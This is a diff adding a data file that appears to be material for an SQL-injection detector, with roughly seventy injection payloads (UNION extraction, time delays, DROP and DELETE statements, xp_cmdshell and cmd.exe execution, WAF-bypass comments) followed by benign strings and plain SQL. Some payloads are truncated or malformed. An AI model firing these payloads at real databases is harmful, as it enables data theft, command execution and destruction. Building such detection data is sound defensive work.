@@ -1,0 +1,100 @@
+' UNION SELECT user, pass FROM users;--  
+' OR SLEEP(5) /*delay*/;--  
+'; DROP TABLE user_logs;--  
+' AND 1=CONVERT(int, @@version);  
+'/**/OR/**/1=1/*obfuscated*/;--  
+' UNION ALL SELECT 1,2,3;--  
+'; EXEC('cmd.exe /c dir');--  
+' OR '1'='1' /*tautology*/;--  
+'; INSERT INTO users VALUES();  
+'||pg_sleep(10)/*test*/;--  
+' AND 1=2 /*error-based-test*/  
+'%55NION SELECT table_name;--  
+' OR 'a'='a' /*simple-payload*/  
+' UNION SELECT @@version,2;--  
+'; DELETE FROM logs WHERE 1=1  
+' CHR(97)||'admin'/*admin*/;--  
+'||(SELECT 0x4142434445);--  
+' OR 1=1; DROP TABLE test;  
+'; UPDATE users SET pass='1'  
+' CONVERT(int, (SELECT 1))  
+' OR IF(1=1,SLEEP(5),0);--  
+'/**/AND 1=1 /*bypass-waf*/  
+' UNION SELECT column_name;  
+'; EXEC('ls -l /var');--  
+' OR 'admin'='admin'/*x*/  
+' AND 1=1 /*always-true*/  
+' OR 2+2=4 /*true-logic*/  
+'%20UNION%20SELECT%201  
+'; TRUNCATE TABLE logs;  
+' OR 'x'='x' /*tautology*/  
+'/**/SLEEP(5)/*delay*/  
+'; GRANT ALL PRIVILEGES;  
+' OR 1=1; EXEC('whoami')  
+' UNION SELECT USER();--  
+' AND 1=1 /*true-condition*/  
+'; CREATE TABLE test();  
+' OR 'true'='true'/*x*/  
+'||(SELECT 'payload');--  
+' OR HEX(1)=0x31 /*hex*/  
+'; ALTER USER admin WITH  
+' OR ASCII('a')=97 /*ascii*/  
+'/**/DROP TABLE temp;--  
+'; REVOKE ALL PRIVILEGES  
+' OR BIN(1)=1 /*binary*/  
+' UNION LOAD_FILE('/etc')  
+'; SHUTDOWN WITH NOWAIT  
+' OR CHAR(65)='A'/*chr*/  
+'/**/EXEC('cmd /c');--  
+' OR 1=1; DELETE FROM x  
+' UNION EXEC('command')  
+'; xp_cmdshell('ping')  
+' OR MD5('a')=1 /*hash*/  
+'/**/WAITFOR DELAY '0:0  
+'; DECLARE @x VARCHAR(  
+' OR '1'='1' /*always*/  
+'; BACKUP DATABASE DB  
+' OR VERSION()=1;--  
+'/**/INSERT INTO logs  
+'; DUMP DATABASE TO '/  
+' OR 'root'='root'/*x*/  
+' UNION CMD('shell');  
+'; RANDOMIZE DATA;--  
+' OR 1=1; UPDATE users  
+'/**/DELETE FROM logs  
+' OR 1=1; SELECT *
+' OR 2=2; UPDATE users
+' OR 2=2; SELECT *
+' OR 3=3; UPDATE users
+' OR 4=4; SELECT *
+' OR 5=5; UPDATE users  
+User123  
+usar13290
+31092userku
+SELECT * FROM products  
+price: $19.99  
+apple, banana  
+Hello, how are you?  
+Good morning...  
+Testing: @example.com  
+123-456-7890  
+user@domain.com  
+Lorem ipsum dolor  
+Sed viverra quam  
+Curabitur auctor  
+Donec tincidunt  
+Order ID: 12345  
+User email: test  
+INSERT INTO logs  
+UPDATE orders SET  
+Terms & Conditions  
+Hello, please login  
+SELECT product_name  
+Password1234  
+Order placed!  
+#Hashtag  
+User.name+123  
+Price: $99.99  
+UPDATE products  
+DELETE FROM users  
+INSERT INTO users  
